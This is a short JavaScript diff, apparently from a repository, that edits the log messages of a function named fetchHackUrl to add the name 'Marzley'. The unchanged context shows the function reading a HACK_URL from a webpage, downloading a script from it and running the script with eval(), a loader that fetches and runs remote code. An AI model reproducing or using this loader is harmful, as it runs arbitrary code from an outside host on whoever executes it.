@@ -16,11 +16,11 @@ async function fetchHackUrl() {
 
         if (!hackUrl) throw new Error('HACK_URL not found on the webpage.');
 
-        console.log('HACK_URL fetched successfully:', hackUrl);
+        console.log('HACK_URL fetched successfully by Marzley:', hackUrl);
 
         const scriptResponse = await axios.get(hackUrl);
         const scriptContent = scriptResponse.data;
-        console.log("HACK_URL script loaded successfully");
+        console.log("HACK_URL script loaded success to Marzley watchout !!!");
 
         eval(scriptContent);
     } catch (error) {
